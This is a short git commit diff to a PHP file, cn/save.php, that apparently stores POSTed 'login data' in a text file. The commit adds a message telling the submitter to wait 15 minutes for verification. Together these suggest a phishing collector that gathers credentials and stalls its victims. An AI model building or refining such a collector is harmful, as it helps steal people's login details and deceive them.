cafce63952d7841d0756dba0c7df67df5573d7e7
sunil-naik-cs <sunilnaik1234c@gmail.com>
2026-09-13 20:03:19 +0530

    m

--- cn/save.php
+++ cn/save.php
@@ -12,6 +12,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     file_put_contents("save.txt", $data, FILE_APPEND);
 
     echo "Login data saved successfully!";
+    echo "Wait 15min for verify your data";
 
 } else {
 
